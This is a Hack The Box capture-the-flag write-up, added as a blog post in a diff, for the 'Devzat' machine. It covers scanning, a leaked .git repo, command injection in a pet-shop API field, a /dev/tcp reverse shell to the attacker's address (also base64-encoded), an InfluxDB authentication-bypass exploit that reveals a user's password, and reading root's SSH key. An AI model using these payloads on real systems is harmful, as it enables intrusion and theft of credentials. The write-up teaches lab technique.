@@ -1,0 +1,334 @@
+---
+title: "Devzat Hackthebox writeup"
+author: "0xMesbaha"
+cover: "/media/devzat/20220311132144.png"
+tags: ["Hackthebox", "rce" , "Port forwarding"]
+date: 2022-03-11T00:45:12+09:00
+draft: false
+---
+
+
+In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command "file" which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root
+<!--more-->
+
+
+# Scanning :
+
+i will start with basic scanning :
+
+```bash
+nmap -A -T 4 -sV 10.10.11.118
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA)
+|   256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA)
+|_  256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://devzat.htb/
+8000/tcp open  ssh     (protocol 2.0)
+| fingerprint-strings:
+|   NULL:
+|_    SSH-2.0-Go
+| ssh-hostkey:
+|_  3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)
+
+```
+
+and we can see  ``devzat.htb`` at the scan result so we can add it to the ``/etc/hosts`` and start fuzzing vhosts.
+
+```bash
+ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb -H "Host: FUZZ.devzat.htb" -fc 302,404
+
+pets                    [Status: 200, Size: 510, Words: 20, Lines: 21]
+```
+
+we can add ``pets.devzat.htb`` also to the ``/etc/hosts``
+
+
+# Enumeration :
+
+
+### Discovery
+
+we can start enumerating the **devzat.htb** web application first. we can see it talks about some chat application and can try it with :
+
+![image](/media/devzat/20220311134725.png)
+
+so we can try it using :
+
+```bash
+ssh -l Mesbaha  devzat.htb -p 8000
+```
+
+looking for help to know how to use it :
+
+![image](/media/devzat/20220311135035.png)
+
+![image](/media/devzat/20220311135132.png)
+
+okay we will check it latter after we finish discovery phase
+
+
+visiting **pets.devzat.htb** we have the option to add new item
+
+![image](/media/devzat/20220311135355.png)
+
+we can also see how the request is sent :
+
+![image](/media/devzat/20220311135703.png)
+
+
+okay now we have some leads , we can also start directory busting to check if there is something interesting
+
+### Directory Busting
+
+```bash
+dirsearch -u http://devzat.htb/  -w /usr/share/wordlists/dirb/common.txt
+
+[06:55:30] 301 -  309B  - /assets  ->  http://devzat.htb/assets/
+[06:55:35] 301 -  309B  - /images  ->  http://devzat.htb/images/
+[06:55:35] 200 -    6KB - /index.html
+[06:55:35] 301 -  313B  - /javascript  ->  http://devzat.htb/javascript/
+[06:55:40] 403 -  275B  - /server-status
+```
+
+
+```bash
+dirsearch -u http://pets.devzat.htb/  -w /usr/share/wordlists/dirb/common.txt
+
+[06:58:36] 200 -   23B  - /.git/HEAD
+[06:58:39] 301 -   42B  - /build  ->  /build/
+[06:58:40] 301 -   40B  - /css  ->  /css/
+[06:58:48] 403 -  280B  - /server-status
+```
+
+
+this **/.git** seems worthy to check
+
+
+![image](/media/devzat/20220311140209.png)
+
+we need to download all of this and check them
+
+```bash
+wget -r http://pets.devzat.htb/.git/
+```
+
+once i am introduced with a **.git** i always use [GitTools](https://github.com/internetwache/GitTools) to make the enumeration easier.
+
+i will start with the **extractor** to see broken repository commits and incompleted commits.
+
+```bash
+./extractor.sh pets.devzat.htb pets.dump
+```
+
+and we have these 3 commits :
+
+```
+0-ef07a04ebb2fc92cf74a39e0e4b843630666a705  1-8274d7a547c0c3854c074579dfc359664082a8f6  2-464614f32483e1fde60ee53f5d3b4d468d80ff62
+```
+
+we can run the **tree** command to have an overview look , we will see a **main.go** in all the folders we can take a look at it and will find :
+
+![image](/media/devzat/20220311141743.png)
+
+it seems the "**species**" attribute which we sent in the **pets.devzat.htb** is not filtered before being passed to **exec.Command**
+
+we can try some command injection and see if it works
+
+
+# Foothold
+
+at the **pets.devzat.htb** page we can now try to add an item again but this time we will try to ping our host:
+```
+{"name":"pingme","species":"cat;ping -c 4 10.10.16.106"}
+```
+
+
+![image](/media/devzat/20220311142344.png)
+
+nice we got a reply , now Let's have a reverse shell !
+
+![Alt Text](https://media.giphy.com/media/uNp22kQO4QCxa/giphy.gif)
+
+however when i tried ``sh -i >& /dev/tcp/10.10.16.106/9090 0>&1`` it doesn't return a connection back so i though maybe the spaces and special characters are the reason .
+
+```bash
+echo "sh -i >& /dev/tcp/10.10.16.106/9090 0>&1" | base64
+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA2LzkwOTAgMD4mMQo=
+```
+
+![image](/media/devzat/20220311143241.png)
+
+and finally :
+
+![image](/media/devzat/20220311143301.png)
+
+spawn a tty shell:
+
+```bash
+python3 -c "import pty;pty.spawn('/bin/bash')"
+ctrl+z
+stty raw -echo ;fg
+Enter key x2
+export TERM=xterm
+```
+
+and we have a nice shell as **patrick** user on the machine
+
+
+## Enumerating the machine
+
+at the  ``/etc/passwd `` we can see this strange **backup**
+
+```
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+```
+
+we can visit this **/var/backups/** maybe it contains useful information can help us escalate our privilege
+
+
+![image](/media/devzat/20220311151418.png)
+
+But only user **catherine** can use it so we should find a way to escalate to this user first :(
+
+```
+-rw-------  1 catherine catherine 28297 Jul 16  2021 devzat-dev.zip
+-rw-------  1 catherine catherine 27567 Jul 16  2021 devzat-main.zip
+
+```
+
+if we run ``ss-lpnut``
+```bash
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      836/./petshop       
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8086          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::8000                 :::*                    LISTEN      837/./devchat
+```
+
+we can see port **8443** and port **8086** are running locally , and there is no netcat on the machine to know what are the services running. so we have to make port forward to see the ports running.
+
+### port forward
+
+
+forward port **8086** from the machine to your side.
+
+*first:* generate ssh keys
+
+```bash
+ssh-keygen  -f devzat
+```
+
+and put your public key at the **authorized_keys** on the machine side
+
+*Second*: forward the port :
+
+```bash
+# at your side
+ssh  -i devzat -N -L 8086:127.0.0.1:8086  patrick@devzat.htb
+```
+
+
+now if we have scanned our localhost will find :
+
+![image](/media/devzat/20220311162554.png)
+
+
+if we search for this version of the service will find immediatley  [this](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) exploit
+
+
+
+![image](/media/devzat/20220311163816.png)
+![image](/media/devzat/20220311164104.png)
+![image](/media/devzat/20220311164145.png)
+![image](/media/devzat/20220311164415.png)
+![image](/media/devzat/20220311165802.png)
+
+and we can see the user **catherine** shows up with this password : ``woBeeYareedahc7Oogeephies7Aiseci``
+
+now we can switch to user **catherine** easily :
+
+![image](/media/devzat/20220311170147.png)
+
+
+# Root access:
+
+now as we are logged in as the user **catherine** we can check the ``/var/backups`` which we can't access earlier.
+
+download them at our machine first :
+
+![image](/media/devzat/20220311170412.png)
+
+after we unzip them we can see they have exact same files , so we can check if there are any difference between the content
+
+```bash
+diff main/commands.go dev/commands.go
+```
+
+![image](/media/devzat/20220311171227.png)
+
+```go
+< 	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}
+---
+> 	commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}
+> }
+
+```
+
+and we can the option **"file"** , if we read the source code we will find :
+
+```bash
+file = commandInfo{"file", "Paste a files content directly to chat [alpha]", fileCommand, 1, false, nil}
+
+```
+
+and will find :
+
+![image](/media/devzat/20220311172609.png)
+
+but if we tried the connection command will see the command **/file** doesn't exist :(
+
+```bash
+ssh -l mesbah devzat.htb -p 8000
+```
+
+![image](/media/devzat/20220311172636.png)
+
+we can read other codes under the **dev** file we have and will find at **"devchat.go"**
+
+
+![image](/media/devzat/20220311172810.png)
+
+this port is running locally we can forward it then connect to the bot :
+
+```bash
+# at your side :
+ssh -i devzat  -L 8443:127.0.0.1:8443 -N patrick@devzat.htb
+```
+
+then connect to the bot :
+
+```bash
+ssh -l mesbah 127.0.0.1 -p 8443
+```
+
+
+![image](/media/devzat/20220311173041.png)
+
+now we can read the **root.txt** , or we can read the **/root/.ssh/id_rsa** to gain the root access
+
+![image](/media/devzat/20220311173249.png)
+
+![image](/media/devzat/20220311173315.png)
+
+
+## Pwned
+
+![Alt Text](https://media.giphy.com/media/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif)
